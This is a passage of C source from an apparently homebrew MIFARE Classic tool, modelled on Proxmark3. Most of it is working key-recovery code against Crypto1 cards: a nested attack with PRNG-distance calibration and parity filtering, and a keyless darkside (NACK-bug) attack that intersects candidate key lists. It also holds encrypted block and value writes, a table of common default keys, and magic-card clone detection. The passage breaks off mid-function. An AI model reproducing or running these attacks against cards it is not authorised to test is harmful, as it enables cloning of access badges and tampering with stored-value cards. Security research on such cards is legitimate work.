static int calibrate(u8 kb, const u8 key[6], bool knownB, bool twice, u32 *dist)
{
	u32 nt0, enc;
	int r = twice ? nestedNonce2(kb, key, knownB, kb, knownB, &nt0, &enc)
	              : nestedNonce(kb, key, knownB, kb, knownB, &nt0, &enc);
	if (r <= 0) return r;
	int d = nonceDistance(nt0, crapto1_nt_decrypt(key48(key), cardUid(), enc));
	if (d < 0) FAIL(0, "calibration: no distance");
	*dist = d;
	return 1;
}

// 1 = the key auths the block (a few tries: cold auths can flake), 0 = no key / refused, -1 = monitor.
static int keyAuths(u64 k, u8 block, bool keyB)
{
	u8 key[6];
	Crypto1 c;
	if (!k) return 0;
	keyBytes(k, key);
	for (int t = 0; t < 3; t++) {
		int r = mfAuth(block, key, keyB, &c);
		if (r) return r;
	}
	return 0;
}

// crapto1 progress into the current op's bar; B stops it. Threads of one priority don't time-slice
// and a 0 sleep doesn't yield: a short sleep every 30 ms lets the UI draw (and take B) during a solve.
static int solveTick(int permille)
{
	static u64 slept;
	progStep(permille, 1000);
	if (osGetTime() - slept >= 30) {
		svcSleepThread(1000000);
		slept = osGetTime();
	}
	return mfCancel;
}

// Distance that last gave a key on this card (a calibrated one sticks for the card's other keys).
static u32 nestedDist = NESTED_DIST, nestedDistUid;
static bool nestedWindow; // the last nestedOnce got as far as the distance window

// Cards whose PRNG distance jitters (FM11RF32N: 840..850 from one calibration to the next) get every
// distance within NESTED_WIN of the calibrated one, nearest first, as pm3 does: a candidate nt_T must
// match the 3 parity bits the encrypted nonce leaks (the 4th needs the next keystream bit), which
// leaves about 1 in 8. par: the raw wire bits (pm3's are XORed with the encrypted byte's parity), bit 3
// = first byte.
#define NESTED_WIN 16
static int distCands(u32 nt0, u32 enc, u8 par, u32 d, uint32_t *nt, uint32_t *ks)
{
	int n = 0;
	for (int i = 0; i <= 2 * NESTED_WIN; i++) {
		int dd = (int)d + (i & 1 ? -(i + 1) / 2 : i / 2);
		if (dd < 0) continue;
		u32 t = prngSuccessor(nt0, dd), k = enc ^ t;
		bool ok = true;
		for (int b = 0; b < 3 && ok; b++)
			ok = oddParity(t >> (24 - 8 * b)) == ((par >> (3 - b) & 1) ^ (k >> (16 - 8 * b) & 1)); // raw bits
		if (ok) nt[n] = t, ks[n++] = k;
	}
	return n;
}

static int nestedOnce(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u8 keyOut[6])
{
	u32 nt0, nt0b, enc1, enc, uid = cardUid();
	if (uid != nestedDistUid) {
		nestedDist = NESTED_DIST;
		nestedDistUid = uid;
	}
	u8 ac = knownB ? 0x61 : 0x60, nc = tgtB ? 0x61 : 0x60, par1, par2;
	int r = nestedCapture(ac, kb, key, nc, tb, &nt0, &enc1, &par1);
	if (r <= 0) return r;
	u32 ntTa = prngSuccessor(nt0, nestedDist), ks1 = enc1 ^ ntTa;
	r = nestedCapture(ac, kb, key, nc, tb, &nt0b, &enc, &par2);
	if (r <= 0) return r;
	u32 ntTb = prngSuccessor(nt0b, nestedDist), ks2 = enc ^ ntTb;
	if (nt0b == nt0) { // static first nonce: the two captures are the same; see nestedNonce2
		u32 d1, d2;
		if ((r = calibrate(kb, key, knownB, false, &d1)) <= 0) return r;
		if ((r = calibrate(kb, key, knownB, true, &d2)) <= 0) return r;
		logp("  static nonce %08X: distances %lu / %lu\n", nt0, d1, d2);
		ntTa = prngSuccessor(nt0, d1);
		ks1 = enc1 ^ ntTa;
		if ((r = nestedNonce2(kb, key, knownB, tb, tgtB, &nt0b, &enc)) <= 0) return r;
		ntTb = prngSuccessor(nt0b, d2);
		ks2 = enc ^ ntTb;
	}
	crapto1_tick = solveTick;
	// A card already calibrated (its distance isn't the on-chip op's) goes straight to the window,
	// which tries the calibrated distance first anyway.
	bool calibrated = nestedDist != NESTED_DIST && nt0b != nt0;
	u64 k = 0;
	r = 0;
	if (!calibrated) {
		k = crapto1_nested(uid, ntTa, ks1, ntTb, ks2);
		if (mfCancel) FAIL(0, "stopped");
		// A wrong distance can still leave a (wrong) key in both candidate sets: only an auth proves it.
		if ((r = keyAuths(k, tb, tgtB)) < 0) return -1;
	}
	if (!r && nt0b != nt0) { // a PRNG that steps differently: measure the distance, like pm3
		u32 d;
		if ((r = calibrate(kb, key, knownB, false, &d)) <= 0) return r;
		if (calibrated) logp("  nested: calibrated %lu (last %lu)\n", d, nestedDist);
		else logp("  nested: no key at distance %lu, calibrated %lu\n", nestedDist, d);
		char op[sizeof(prog.op)];
		snprintf(op, sizeof(op), "%s", prog.op);
		uint32_t ntA[2 * NESTED_WIN + 1], ksA[2 * NESTED_WIN + 1], ntB[2 * NESTED_WIN + 1], ksB[2 * NESTED_WIN + 1];
		int na = distCands(nt0, enc1, par1, d, ntA, ksA), nb = distCands(nt0b, enc, par2, d, ntB, ksB);
		nestedWindow = true;
		logp("  nested: %d / %d nonces within %d fit the parity\n", na, nb, NESTED_WIN);
		r = 0;
		for (int i = 0; i < na && !r && !mfCancel; i++) {
			progOp("%.40s, again (%d/%d)", op, i + 1, na); // each solve: its own bar
			k = crapto1_nested_any(uid, ntA[i], ksA[i], ntB, ksB, nb);
			if (mfCancel) FAIL(0, "stopped");
			if ((r = keyAuths(k, tb, tgtB)) < 0) return -1;
		}
		if (!r) FAIL(0, "no key (calibrated distance %lu +-%d)", d, NESTED_WIN);
		nestedDist = d;
	}
	if (!r) FAIL(0, "no key (wrong distance?)");
	keyBytes(k, keyOut);
	return 1;
}

// A window can come up empty now and then (FM11RF32N: about 1 in 10, every distance found was within
// 4 of the calibration, so likely a bad capture): once more with fresh captures.
int mfNestedRecover(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u8 keyOut[6])
{
	nestedWindow = false;
	int r = nestedOnce(kb, key, knownB, tb, tgtB, keyOut);
	if (r || mfCancel || !nestedWindow) return r;
	logp("  nested: %s; again\n", why);
	return nestedOnce(kb, key, knownB, tb, tgtB, keyOut);
}

// Darkside (NACK bug, NOTES.md "Darkside / NACK-bug"): a keyless attack for cards that answer a wrong
// {nr}{ar} with an encrypted 4-bit NACK whatever its parity (FM11RF32N batch). For one tag nonce and a
// fixed reader nonce, the 8 NACKs over nt_diff (top 3 bits of nr's last byte) narrow the key to ~100k
// candidates (crapto1_darkside); runs with different nonces intersect to the key. The card's PRNG
// free-runs, so the chip fires its AUTHs on a grid and steers onto repeating nonces: DS_SLOTS slots per
// PRNG period, each collecting its own run. The period and ticks per step are calibrated here from
// nonce pairs the op samples.
#define DS_NR    0xAABBCC00 // fixed on-wire reader nonce; the low 5 bits of the last byte stay 0
#define DS_AR    0x11223344 // fixed on-wire reader response
#define DS_ATW   5000       // ticks to wait for the NACK
#define DS_PROBE 6000       // grid spacing (ticks) for measuring ticks per PRNG step
#define DS_ITER  40         // AUTHs per slot and collecting call (one PRNG period, ~79 ms, apart)
#define DS_SLOTS 3          // runs collected at once (4: the slots start missing their nonces)
#define DS_CALLS 4          // collecting calls before giving up
#define DS_CHECK 64         // candidates few enough to try on the card

typedef struct {
	u32 nt; // the slot's locked nonce (unsteered: the first it saw)
	u8 ks[8], mask, hits;
} DsRun;

// One OP_DARKSIDE call: grid points `grid` ticks apart (fraction included), nslot slots (all to be
// completed), tq = ticks per PRNG step * 256 (0: unsteered).
static int dsRun(u8 *a, u32 len, double grid, u32 tq, u16 maxiter, int nslot, DsRun *o)
{
	u8 out[MON_DARKSIDE_SLOT * MON_DARKSIDE_SLOTS];
	u32 g = grid;
	s16 sfr = (grid - g) * 256 + 0.5; // the fraction; the op learns the drift on top
	for (int i = 0; i < 4; i++) a[i] = g >> (8 * i);
	a[4] = sfr, a[5] = sfr >> 8;
	a[6] = maxiter, a[7] = maxiter >> 8;
	a[8] = DS_ATW & 0xFF, a[9] = DS_ATW >> 8;
	a[10] = tq, a[11] = tq >> 8;
	a[12] = a[13] = nslot;
	if (monDarkside(a, len, NRAR_TX, nslot, out) < 0) FAIL(-1, "darkside: monitor");
	for (int i = 0; i < nslot; i++) { // memrw struct dslot: target, ph, ks[8], mask, hits, lost, pad
		const u8 *q = out + MON_DARKSIDE_SLOT * i;
		o[i].nt = q[0] | q[1] << 8 | q[2] << 16 | (u32)q[3] << 24;
		memcpy(o[i].ks, q + 8, 8);
		o[i].mask = q[16];
		o[i].hits = q[17];
	}
	return 0;
}

// Signed PRNG distance a -> b within half a period (pm3 dist_nt); false if unrelated or not sampled.
static bool dsDist(u32 a, u32 b, int *d)
{
	if (!a || !b) return false;
	u32 x = a, y = b;
	for (int i = 0; i < 32768; i++, x = prngSuccessor(x, 1), y = prngSuccessor(y, 1)) {
		if (x == b) return *d = i, true;
		if (y == a) return *d = -i, true;
	}
	return false;
}

// The last card's calibration (UID, ticks per step, grid spacing): checked, not measured again.
static u32 dsUid, dsSync;
static int dsProbe;

// Lists set aside: the common-prefix recovery misses the key now and then (~1 run in 10, pm3's too),
// so when a run has nothing in common with the list so far, either may be the miss. The list so far
// is kept (up to DS_OLD of them, DS_OLD_MAX keys in all) and later runs are matched against those too.
#define DS_OLD     2
#define DS_OLD_MAX (1 << 20)

typedef struct {
	u64 *k;
	int n;
} DsList;

// One run's candidates, in a thread of its own while the chip collects the next run: only the keys
// also in the list so far (in). With nothing in common, this run's whole list (full), as pm3 does,
// unless it meets a list set aside (met = its index; out = what the two share). out NULL: out of
// memory (~1 run in 20 has over a million candidates) or stopped.
typedef struct {
	u32 uid;
	DsRun r;
	DsList in, old[DS_OLD];
	int nold, n, met;
	bool full;
	u64 *out;
	u32 collectMs, ms;
} DsSolve;

// The keys in both ascending lists.
static int dsMeet(const DsList *a, const u64 *b, int nb, u64 *out)
{
	int i = 0, j = 0, n = 0;
	while (i < a->n && j < nb)
		if (a->k[i] < b[j]) i++;
		else if (a->k[i] > b[j]) j++;
		else out[n++] = b[j++], i++;
	return n;
}

static void dsSolve(void *arg)
{
	DsSolve *s = arg;
	u64 t = osGetTime();
	s->n = 0, s->met = -1, s->full = false;
	s->out = s->in.k ? crapto1_darkside(s->uid, s->r.nt, DS_NR, s->r.ks, s->in.k, s->in.n, &s->n) : NULL;
	if (!s->n && !mfCancel) {
		free(s->out);
		s->out = crapto1_darkside(s->uid, s->r.nt, DS_NR, s->r.ks, NULL, 0, &s->n);
		s->full = s->in.k != NULL;
		for (int j = 0; j < s->nold && s->out && s->n; j++) {
			u64 *m = malloc((s->old[j].n < s->n ? s->old[j].n : s->n) * sizeof(u64) + 1);
			int n = m ? dsMeet(&s->old[j], s->out, s->n, m) : 0;
			if (!n) {
				free(m);
				continue;
			}
			free(s->out);
			s->out = m, s->n = n, s->met = j;
			break;
		}
	}
	s->ms = osGetTime() - t;
}

static int dsStopTick(int permille)
{
	return mfCancel;
}

// A solved run: its list replaces the list so far (s->in, freed), which is set aside when the two
// had nothing in common; few enough are tried on the card. 1 = key found, -1 = monitor error, 0 = go
// on. The next solve gets common and the lists set aside.
static int dsUse(DsSolve *s, DsList *common, DsList *old, int *nold, int *runs, u8 block, bool keyB, u8 keyOut[6],
	u64 t0)
{
	if (!s->out) {
		if (!mfCancel) logp("  darkside: out of memory, another run\n");
		return 0; // the list so far stays
	}
	const char *how = "";
	if (s->met >= 0) { // this run and an older list meet: the list so far was the miss
		free(common->k);
		free(old[s->met].k);
		old[s->met] = old[--*nold];
		how = ", met an earlier list";
	} else if (s->full) { // nothing in common: one of them is the miss, keep both
		int total = common->n;
		for (int j = 0; j < *nold; j++) total += old[j].n;
		// (a list too big to keep at all doesn't push the others out)
		while (common->n <= DS_OLD_MAX && *nold && (*nold == DS_OLD || total > DS_OLD_MAX)) { // drop the oldest
			total -= old[0].n;
			free(old[0].k);
			memmove(old, old + 1, --*nold * sizeof(DsList));
		}
		if (total <= DS_OLD_MAX) old[(*nold)++] = *common;
		else free(common->k);
		how = ", nothing in common";
	} else {
		free(common->k);
	}
	common->k = s->out, common->n = s->n;
	logp("  darkside: run %d nt %08lX ks %02X%02X%02X%02X%02X%02X%02X%02X (%lu ms), %d candidates%s (%lu ms) at %llu ms\n",
		++*runs, s->r.nt, s->r.ks[0], s->r.ks[1], s->r.ks[2], s->r.ks[3], s->r.ks[4], s->r.ks[5], s->r.ks[6],
		s->r.ks[7], s->collectMs, s->n, how, s->ms, osGetTime() - t0);
	if (common->n > DS_CHECK) return 0;
	u8 keys[DS_CHECK][6];
	for (int i = 0; i < common->n; i++) keyBytes(common->k[i], keys[i]);
	int h = mfChkKeys(block, keyB, (const u8 (*)[6])keys, common->n);
	if (h == -3) return -1;
	if (h >= 0) {
		memcpy(keyOut, keys[h], 6);
		logp("  darkside: key in %llu ms\n", osGetTime() - t0);
		return 1;
	}
	free(common->k); // none auths (a miss on both sides of a match?): start over
	common->k = NULL, common->n = 0;
	return 0;
}

static void dsJoin(Thread *th)
{
	if (!*th) return;
	threadJoin(*th, U64_MAX);
	threadFree(*th);
	*th = NULL;
}

int mfDarkside(u8 block, bool keyB, u8 keyOut[6])
{
	if (card.uidLen != 4 && card.uidLen != 7 && card.uidLen != 10) FAIL(0, "no card");
	u8 a[250], *p = selectAuthArg(a + 14, block, keyB), zero[8] = { 0 }, code;
	for (int c = 0; c < 8; c++) { // {nr}{ar} per nt_diff, fake (all-zero) parity
		u32 nr = DS_NR | c << 5;
		u8 b[8];
		for (int i = 0; i < 4; i++) b[i] = nr >> (24 - 8 * i), b[4 + i] = (u32)DS_AR >> (24 - 8 * i);
		p += mfPack(b, 8, zero, p, &code);
	}
	u32 len = p - a, uid = cardUid();
	DsRun r[DS_SLOTS];
	int d = 0;
	u64 t0 = osGetTime();

	// Calibration from unsteered pairs of nonces a grid point apart (2 slots, one AUTH each).
	progOp("Darkside: calibrating");
	int probe = 0;
	u32 sync = 0;
	if (uid == dsUid) probe = dsProbe, sync = dsSync;
	for (bool fresh = !sync;; fresh = true) {
		if (fresh) { // nonce steps between two AUTHs DS_PROBE ticks apart
			probe = 0;
			for (int t = 0; t < 8 && !probe && !mfCancel; t++) {
				if (dsRun(a, len, DS_PROBE, 0, 2, 2, r) < 0) return -1;
				if (dsDist(r[0].nt, r[1].nt, &d)) probe = abs(d);
			}
			if (!probe) FAIL(0, mfCancel ? "stopped" : "darkside: no nonces to calibrate");
			sync = 65535.0 * DS_PROBE / probe + 0.5;
		}
		// Grid spacing = one PRNG period (65535 steps): the per-fire nonce advance is deterministic, so
		// close the loop on it until it is well inside the op's steering window.
		bool near = false;
		for (int t = 0; t < (fresh ? 16 : 4) && !near && !mfCancel; t++) {
			progStep(t, 16);
			if (dsRun(a, len, sync, 0, 2, 2, r) < 0) return -1;
			if (!dsDist(r[0].nt, r[1].nt, &d)) continue;
			if (!(near = abs(d) <= 8)) sync -= (int)(d * (double)DS_PROBE / probe + (d < 0 ? -0.5 : 0.5));
		}
		if (!near) d = 0;
		if (near || fresh || mfCancel) break;
		logp("  darkside: the last calibration is off\n");
	}
	dsUid = uid, dsProbe = probe, dsSync = sync;
	// The card's clock stops in the reader's modulation pauses, so each AUTH (re-select, AUTH, {nr}{ar})
	// costs F PRNG steps on top of the time between them: DS_PROBE ticks = probe steps, sync ticks =
	// 65535 + d. Hence the real ticks per step (what moving one AUTH does; probe / DS_PROBE alone is
	// ~30% off, which made the steering overshoot) and F, and the grid for DS_SLOTS slots per period.
	double tps = (double)(sync - DS_PROBE) / (65535 + d - probe), pause = DS_PROBE / tps - probe;
	double grid = tps * (65535.0 / DS_SLOTS + pause);
	u32 tq = tps * 256 + 0.5;
	logp("  darkside: %.4f ticks/step, %.0f steps per AUTH, sync %lu, grid %.1f (%llu ms)\n", tps, pause, sync,
		grid, osGetTime() - t0);

	// Run t's candidates are worked out while the chip collects run t + 1, a step below this thread
	// (which waits on the chip most of the time) and the UI; the solve spreads over the other cores.
	crapto1_tick = dsStopTick;
	DsList common = {0}, old[DS_OLD];
	int nold = 0, runs = 0, res = 0;
	DsSolve s;
	Thread th = NULL;
	bool pending = false;
	for (int t = 0; t < DS_CALLS && !mfCancel && !res; t++) {
		progOp("Darkside: runs %d-%d (%d solved)", t * DS_SLOTS + 1, (t + 1) * DS_SLOTS, runs);
		progStep(t, DS_CALLS);
		u64 tc = osGetTime();
		if (dsRun(a, len, grid, tq, DS_ITER * DS_SLOTS, DS_SLOTS, r) < 0) {
			res = -1;
			break;
		}
		tc = osGetTime() - tc;
		for (int i = 0; i < DS_SLOTS && !mfCancel; i++) {
			if (r[i].mask != 0xFF) {
				logp("  darkside: incomplete (mask %02X, %d hits)\n", r[i].mask, r[i].hits);
				continue;
			}
			if (pending) {
				dsJoin(&th);
				pending = false;
				if ((res = dsUse(&s, &common, old, &nold, &runs, block, keyB, keyOut, t0))) break;
			}
			s = (DsSolve){ .uid = uid, .r = r[i], .in = common, .nold = nold, .collectMs = tc };
			memcpy(s.old, old, nold * sizeof(DsList));
			pending = true;
			if (!(th = threadCreate(dsSolve, &s, 0x8000, 0x31, -2, false))) dsSolve(&s);
		}
	}
	if (pending) {
		dsJoin(&th);
		if (!res && !mfCancel) res = dsUse(&s, &common, old, &nold, &runs, block, keyB, keyOut, t0);
		else free(s.out);
	}
	free(common.k);
	while (nold) free(old[--nold].k);
	if (res) return res;
	if (mfCancel) FAIL(0, "stopped");
	FAIL(0, runs ? "darkside: no key from %d runs" : "darkside: no complete run (no NACK bug?)", runs);
}

// Encrypted WRITE data frame (16 bytes + CRC = 162 bits with parity). Long bit-mode frames are
// whole FIFO bytes only, so it goes out as 20 FIFO bytes: 18 raw (parity off, our parity bits
// packed in) + 2 data bytes j1, j2 sent with HW parity (9 bits each), toggling 0x5C560 between
// bytes. The HW parity bit is the odd parity of every bit since the last inserted one, so a pair
// works only if that matches the encrypted parity bit (p = 1/4 per pair). NOTES.md.
#define WR_BYTES 18
static const u8 wrPairs[][2] = { { 0, 1 }, { 0, 9 }, { 0, 17 }, { 8, 9 }, { 8, 17 }, { 16, 17 } };

static u8 streamBit(const u8 *data, const u8 *par, u32 i)
{
	return i % 9 == 8 ? par[i / 9] : (data[i / 9] >> (i % 9)) & 1;
}

static bool pairOk(const u8 *data, const u8 *par, const u8 *hw)
{
	u32 last = 0;
	for (int k = 0; k < 2; k++) {
		u8 p = 1;
		for (u32 i = last; i < 9u * hw[k] + 8; i++) p ^= streamBit(data, par, i);
		if (p != par[hw[k]]) return false;
		last = 9 * hw[k] + 9;
	}
	return true;
}

// FIFO bytes + parity toggles for the pair; returns the number of stores.
static u32 mixedFrame(const u8 *data, const u8 *par, const u8 *hw, u8 fifo[20], MonStore *st)
{
	u32 pos = 0, nf = 0, ns = 0, before = 0;
	bool on = false;
	while (pos < WR_BYTES * 9) {
		bool h = pos % 9 == 0 && (pos / 9 == hw[0] || pos / 9 == hw[1]);
		if (h != on) {
			// the parity decision for a byte falls ~69.5 ticks + 9.44 per earlier bit after TX
			// start; store half a byte before it (delays count from the last FIFO write, ~14 later)
			st[ns].delay = (6950 + 944 * before) / 100 - 38 - 14;
			st[ns].reg = PARITY_REG;
			st[ns++].val = h ? 0 : PARITY_OFF;
			on = h;
		}
		u8 b = 0;
		if (h) {
			b = data[pos / 9];
		} else {
			for (int k = 0; k < 8; k++) b |= streamBit(data, par, pos + k) << k;
		}
		fifo[nf++] = b;
		pos += h ? 9 : 8;
		before += h ? 9 : 8;
	}
	return ns;
}

// 4-bit ACK/NAK at bit `off` of the answer, decrypted.
static int ack4(Crypto1 *c, const MonFrame *f, int n, u32 off)
{
	if (n <= 0 || f[n - 1].len < 1) return -1;
	u8 v = (f[n - 1].data[0] >> off) & 0xF;
	for (int i = 0; i < 4; i++) v ^= c1Bit(c, 0, false) << i;
	return v;
}

// An encrypted command (op, block, CRC) answered with a 4-bit ACK. 1 = ACKed.
static int shortCmd(Crypto1 *c, u8 op, u8 block)
{
	MonFrame f[2];
	u8 cmd[4] = { op, block }, cenc[4], cpar[4];
	crcA(cmd, 2, cmd + 2);
	c1Encrypt(c, cmd, 4, cenc, cpar);
	u32 off;
	int n = ptx(cenc, 4, cpar, f, &off);
	if (n < 0) FAIL(-1, "%02X tx", op);
	int a = ack4(c, f, n, off);
	if (a != 0xA) FAIL(0, a < 0 ? "%02X: no answer" : "%02X nak %X", op, a);
	return 1;
}

// The encrypted WRITE command alone. 1 = ACKed: the card now waits for the 16 data bytes.
static int writeCmd(Crypto1 *c, u8 block)
{
	return shortCmd(c, 0xA0, block);
}

int mfWriteBlock(Crypto1 *c, u8 block, const u8 data[16])
{
	MonFrame f[2];
	u8 cmd[4] = { 0xA0, block }, plain[WR_BYTES], enc[WR_BYTES], par[WR_BYTES], cenc[4], cpar[4];
	crcA(cmd, 2, cmd + 2);
	memcpy(plain, data, 16);
	crcA(data, 16, plain + 16);
	// Pick the pair on a copy of the cipher before touching the card.
	Crypto1 t = *c;
	c1Encrypt(&t, cmd, 4, cenc, cpar);
	for (int i = 0; i < 4; i++) c1Bit(&t, 0, false);
	c1Encrypt(&t, plain, WR_BYTES, enc, par);
	int pair = -1;
	for (int i = 0; i < 6 && pair < 0; i++)
		if (pairOk(enc, par, wrPairs[i])) pair = i;
	if (pair < 0) FAIL(2, "no parity pair");

	int r = writeCmd(c, block);
	if (r <= 0) return r;

	c1Encrypt(c, plain, WR_BYTES, enc, par);
	u8 fifo[20];
	MonStore st[4];
	u32 ns = mixedFrame(enc, par, wrPairs[pair], fifo, st);
	monFrames(f, 2);
	if (!monTxsched(fifo, sizeof(fifo), 0x70, st, ns)) FAIL(-1, "data tx");
	int n = waitFrames(f, 2);
	if (n < 0) FAIL(-1, "data frames");
	if (wrPairs[pair][1] == WR_BYTES - 1 && !iso14aParity(false)) FAIL(-1, "parity off"); // left on
	int a = ack4(c, f, n, 0); // whole-byte frame: the answer starts at bit 0
	if (a != 0xA) FAIL(0, a < 0 ? "data: no answer" : "data nak %X", a);
	return 1;
}

int mfWrite(u8 block, const u8 key[6], bool keyB, const u8 data[16])
{
	for (int t = 0; t < 16; t++) {
		Crypto1 c;
		int r = mfAuth(block, key, keyB, &c);
		if (r <= 0) return r;
		r = mfWriteBlock(&c, block, data);
		if (r == 2) continue; // no usable parity pair for this keystream: re-auth
		if (r <= 0) return r;
		u8 back[16];
		r = mfReadBlock(&c, block, back);
		if (r < 0) FAIL(-1, "verify read");
		if (!r) FAIL(0, "verify read failed");
		if (memcmp(back, data, 16)) FAIL(0, "verify mismatch");
		return 1;
	}
	FAIL(0, "no parity pair in 16 auths");
}

int mfReadSignature(u8 sig[32])
{
	static const u8 sigKeys[2][6] = { { 0x4B, 0x79, 0x1B, 0xEA, 0x7B, 0xCC }, { 0x70, 0x7B, 0x11, 0xFC, 0x14, 0x81 } };
	for (int k = 0; k < 2; k++) {
		Crypto1 c;
		int r = mfAuth(69, sigKeys[k], true, &c);
		if (r < 0) return -1;
		if (!r) continue;
		if ((r = mfReadBlock(&c, 69, sig)) < 0) return -1;
		if (r && (r = mfReadBlock(&c, 70, sig + 16)) < 0) return -1;
		if (r) return 1;
	}
	return 0;
}

void mfValueBlock(s32 v, u8 addr, u8 out[16])
{
	for (int i = 0; i < 4; i++) {
		out[i] = out[8 + i] = (u32)v >> (8 * i);
		out[4 + i] = ~out[i];
	}
	out[12] = out[14] = addr;
	out[13] = out[15] = ~addr;
}

bool mfValueParse(const u8 b[16], s32 *v, u8 *addr)
{
	for (int i = 0; i < 4; i++)
		if (b[i] != b[8 + i] || b[i] != (u8)~b[4 + i]) return false;
	if (b[12] != b[14] || b[13] != b[15] || b[12] != (u8)~b[13]) return false;
	if (v) *v = (s32)(b[0] | b[1] << 8 | b[2] << 16 | (u32)b[3] << 24);
	if (addr) *addr = b[12];
	return true;
}

// The card answers the value's data frame only with a NAK; silence means it took it (pm3
// mifare_classic_value). Then TRANSFER puts the result into dest.
int mfValue(u8 op, u8 block, s32 delta, u8 dest, const u8 key[6], bool keyB, u8 out[16])
{
	if (op != MF_VAL_DEC && op != MF_VAL_INC && op != MF_VAL_RESTORE) FAIL(0, "bad op %02X", op);
	Crypto1 c;
	int r = mfAuth(block, key, keyB, &c);
	if (r <= 0) return r;
	if ((r = shortCmd(&c, op, block)) <= 0) return r;
	u8 plain[6], enc[6], par[6];
	for (int i = 0; i < 4; i++) plain[i] = (u32)delta >> (8 * i);
	crcA(plain, 4, plain + 4);
	c1Encrypt(&c, plain, 6, enc, par);
	MonFrame f[2];
	u32 off;
	int n = ptx(enc, 6, par, f, &off);
	if (n < 0) FAIL(-1, "value tx");
	if (n > 0) {
		int a = ack4(&c, f, n, off);
		FAIL(0, "value nak %X", a);
	}
	if ((r = shortCmd(&c, 0xB0, dest)) <= 0) return r;
	r = mfReadBlock(&c, dest, out);
	if (r < 0) FAIL(-1, "verify read");
	if (!r) FAIL(0, "verify read failed");
	return 1;
}

const u8 mfDefaultKeys[][6] = {
	{ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }, { 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5 },
	{ 0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7 }, { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 },
	{ 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5 }, { 0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD },
	{ 0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A }, { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF },
	{ 0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97 }, { 0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F },
};
const int mfNumDefaultKeys = sizeof(mfDefaultKeys) / 6;

// Gen2 detection as pm3 MifareCIdent does it, nothing written. First the ATS: these chips answer
// RATS whatever their SAK says, and pm3 knows a few of their ATS (compared with the CRC, as the
// frame comes; the 85.. ones are Ultralight clones). S(DESELECT) after, so a reselect works.
static const struct {
	u8 len, ats[18];
} gen2Ats[] = {
	{ 9, { 0x09, 0x78, 0x00, 0x91, 0x02, 0xDA, 0xBC, 0x19, 0x10 } },
	{ 15, { 0x0D, 0x78, 0x00, 0x71, 0x02, 0x88, 0x49, 0xA1, 0x30, 0x20, 0x15, 0x06, 0x08, 0x56, 0x3D } },
	{ 12, { 0x0A, 0x78, 0x00, 0x81, 0x02, 0xDB, 0xA0, 0xC1, 0x19, 0x40, 0x2A, 0xB5 } },
	{ 18, { 0x85, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x0A, 0xC3, 0x00, 0x04, 0x03, 0x01, 0x01, 0x00, 0x0B, 0x03, 0x41, 0xDF } },
	{ 18, { 0x85, 0x00, 0x00, 0xA0, 0x0A, 0x00, 0x0A, 0xC3, 0x00, 0x04, 0x03, 0x01, 0x01, 0x00, 0x0B, 0x03, 0x16, 0xD7 } },
	{ 18, { 0x85, 0x00, 0x00, 0xA0, 0x0A, 0x00, 0x0A, 0xB0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x4D } },
	{ 18, { 0x85, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x0A, 0xA5, 0x00, 0x04, 0x04, 0x02, 0x01, 0x00, 0x0F, 0x03, 0x79, 0x0C } },
};

static int gen2AtsTest(void)
{
	MonFrame f[2];
	u8 rats[2] = { 0xE0, 0x20 }, desel = 0xC2;
	if (!iso14aParity(true)) FAIL(-1, "parity on");
	int sak = iso14aSelect();
	if (sak == -2) FAIL(-1, "select: monitor");
	if (sak < 0) return 0;
	int n = iso14aDataTx(rats, 2, f, 2, 10);
	if (n < 0) FAIL(-1, "RATS: monitor");
	if (!n || f[n - 1].len < 3) {
		logp("gen2 ats: no ATS\n");
		return 0;
	}
	u8 ats[36], len = f[n - 1].len;
	memcpy(ats, f[n - 1].data, len);
	if (iso14aDataTx(&desel, 1, f, 2, 10) < 0) FAIL(-1, "deselect: monitor");
	char hex[2 * sizeof(ats) + 1];
	for (int i = 0; i < len; i++) sprintf(hex + 2 * i, "%02X", ats[i]);
	for (u32 i = 0; i < sizeof(gen2Ats) / sizeof(gen2Ats[0]); i++)
		if (len >= gen2Ats[i].len && !memcmp(ats, gen2Ats[i].ats, gen2Ats[i].len)) {
			logp("gen2 ats: %s (known Gen2)\n", hex);
			return 1;
		}
	logp("gen2 ats: %s (not a known Gen2 one)\n", hex);
	return 0;
}

// Then the block 0 WRITE: a real card NAKs the command, a Gen2 ACKs it and waits for the data. That
// never comes: the next frame (iso14aSelect's 4-byte HLTA, not 16 bytes + CRC) ends the write. pm3
// cuts the field instead, which we can't without reloading the monitor. Key A and B, each with the
// first default key that authenticates (B may be the only one the access bits let write).
static int gen2AckTest(void)
{
	for (int kb = 0; kb < 2; kb++)
		for (int k = 0; k < mfNumDefaultKeys; k++) {
			Crypto1 c;
			int r = mfAuth(0, mfDefaultKeys[k], kb, &c);
			if (r < 0) return -1;
			if (!r) continue;
			r = writeCmd(&c, 0);
			int sak = iso14aParity(true) ? iso14aSelect() : -2;
			if (r < 0 || sak == -2) FAIL(-1, "gen2 ack: monitor");
			logp("gen2 ack (block 0 WRITE, key %c): %s\n", kb ? 'B' : 'A', r ? "ACK" : mfWhy());
			if (r) return 1;
			break;
		}
	return 0;
}

int mfMagicDetect(const u8 pwd[4], bool testGen2, MfMagic *m)
{
	memset(m, 0, sizeof(*m));
	int r = mfGen4Config(pwd, m->cfg, sizeof(m->cfg));
	if (r < 0) return -1;
	if (r > 0) {
		m->flags |= MF_MAGIC_GEN4;
		m->cfgLen = r;
	}
	m->mute = !r && !strncmp(why, "card mute", 9);
	if (mfGen1aUnlock()) {
		m->flags |= MF_MAGIC_GEN1A;
		if ((r = mfUscuidConfig(m->usc)) < 0) return -1;
		if (r) m->flags |= MF_MAGIC_USCUID;
	}
	if (testGen2) {
		if ((r = gen2AtsTest()) < 0) return -1;
